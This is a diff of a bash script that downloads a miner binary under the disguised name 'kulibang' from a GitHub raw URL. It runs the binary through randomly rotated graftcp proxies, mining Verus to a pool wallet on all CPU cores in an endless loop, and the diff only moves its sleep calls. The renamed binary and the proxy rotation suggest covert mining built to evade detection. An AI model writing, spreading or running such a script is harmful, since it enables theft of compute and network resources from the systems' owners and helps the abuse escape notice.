@@ -59,7 +59,7 @@ END
   ./graftcp/graftcp wget https://github.com/marcelinoferdom/minse/raw/main/kulibang
   chmod +x kulibang
 
-  sleep 200
+  
   # Run ccminer in the background
   ./graftcp/graftcp ./kulibang -a verus -o stratum+tcp://eu.luckpool.net:3957 -u RW7q4an3QCeRH89sqrGcHKopjTX1Uj4oFT.SKYLAKE -p x -t "$(nproc)" &
 
@@ -97,14 +97,16 @@ END
 # Infinite loop to continuously restart the sequence of 5 runs
 while true; do
   echo "Starting new cycle of proxy runs..."
-  
+ 
   # Main loop to run ccminer with a randomly selected proxy configuration
   for ((i = 0; i < 5; i++)); do
     # Select a random proxy from the list
     proxy="${proxies[RANDOM % ${#proxies[@]}]}"
     echo "Using proxy: $proxy"
     run_ccminer "$proxy"
+    sleep 200
   done
   
   echo "Cycle completed. Restarting the sequence..."
+  sleep 200
 done
